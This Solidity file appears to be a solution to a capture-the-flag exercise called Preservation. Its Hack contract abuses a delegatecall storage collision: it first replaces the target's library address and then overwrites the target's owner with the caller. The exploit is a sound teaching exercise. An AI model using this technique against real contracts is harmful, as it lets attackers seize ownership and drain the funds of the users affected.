// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "failed");
    }

    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}
